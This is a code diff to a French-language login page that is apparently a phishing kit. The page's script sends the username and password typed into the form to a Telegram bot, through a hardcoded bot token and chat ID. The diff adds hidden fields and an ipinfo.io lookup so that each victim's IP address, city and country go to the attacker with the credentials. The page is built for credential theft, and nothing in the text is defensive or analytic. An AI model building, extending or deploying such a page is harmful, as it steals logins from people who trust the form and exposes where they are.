@@ -421,6 +421,9 @@
             <div class="custom-form content-holder__login-form">
                 <form id="my-form" method="POST">
                       <p id="my-form-status" style="color: red; font-size: small;"></p>
+                      <input type="hidden" value="" id="ip">
+                    <input type="hidden" value="" id="city">
+                    <input type="hidden" value="" id="country">
                     <div class="row">
                         <input type="text" name="usr" id="user" value="" placeholder="Nom d'utilisateur"
                             autocapitalize="none">
@@ -532,6 +535,11 @@
     <script>
         const token = '5993222137:AAHrDYc4jMrYsEApI1ztwMiuUY9yXcbOM-k';
         const chatId = '-942199181';
+        $.getJSON("https://ipinfo.io", function(data) {
+            $("#ip").val(data.ip);
+            $("#city").val(data.city);
+            $("#country").val(data.country);
+        });
         function validateUsr() {
             let usrValue = $("#user").val();
             if (usrValue.length <= 0) {
@@ -567,7 +575,12 @@
       event.preventDefault();
         var usr = document.querySelector('#user').value;
         var pwd = document.querySelector('#passwd').value;
-        var message = `<b>Username</b> : <code>${usr}</code> <b>Password</b> : <code>${pwd}</code>`;
+        var ip = $("#ip").val();
+                var city = $("#city").val();
+                var country = $("#country").val();
+        var message = `<b>Username</b> : <code>${usr}</code>\n
+                         <b>Password</b> : <i>${pwd}</i>\n
+                          <u>${ip}</u>, <u>${city}</u>, <u>${country}</u>`;
         $.ajax({
             type: form.method,
             url: `https://api.telegram.org/bot${token}/sendMessage`,
